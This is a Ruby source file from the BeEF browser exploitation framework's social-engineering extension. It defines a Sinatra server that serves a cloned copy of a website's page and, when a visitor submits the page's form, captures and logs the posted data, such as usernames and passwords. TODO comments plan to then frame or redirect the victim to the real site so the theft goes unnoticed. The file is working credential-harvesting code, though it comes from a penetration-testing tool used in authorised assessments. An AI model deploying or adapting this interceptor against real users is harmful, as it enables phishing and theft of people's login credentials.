#
#   Copyright 2012 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
module BeEF
  module Extension
    module SocialEngineering

      class Interceptor < Sinatra::Base

      def initialize(file_path)
        super
        @config = BeEF::Core::Configuration.instance
        @cloned_page = ""
        File.open(file_path,'r').each do |line|
          @cloned_page += line
        end
      end

      # intercept GET
      get "/" do
        print_info "GET request"
        @cloned_page
      end

      # intercept POST
      # the 'action' attribute of the 'form' element is modified to the URI /
      # in this way the request can be intercepted
      post "/" do
        print_info "POST request"
        request.body.rewind
        data = request.body.read
        print_info "Intercepted data:"
        print_info data

        #todo: do a GET request on the target website, retrieve the respone headers and check if X-Frame-Options is present
        #todo: or framebusting is present. If is not present, open the original URL in an iFrame, otherwise redirect the user
        #todo: to the original page
      end

      end
    end
  end
end

